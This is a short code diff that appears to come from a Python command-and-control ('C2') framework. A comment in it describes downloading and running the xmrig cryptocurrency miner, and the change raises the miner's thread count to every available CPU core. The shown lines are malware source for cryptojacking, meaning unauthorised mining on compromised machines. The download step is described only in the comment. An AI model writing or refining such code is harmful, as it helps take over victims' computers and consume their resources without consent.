@@ -470,7 +470,7 @@ class C2():
             # if that fails, try downloading and running xmrig
             try:
                 import multiprocessing
-                threads = multiprocessing.cpu_count() - 1
+                threads = multiprocessing.cpu_count()
 
                 # find correct executable for this platform
                 if sys.platform == 'linux':
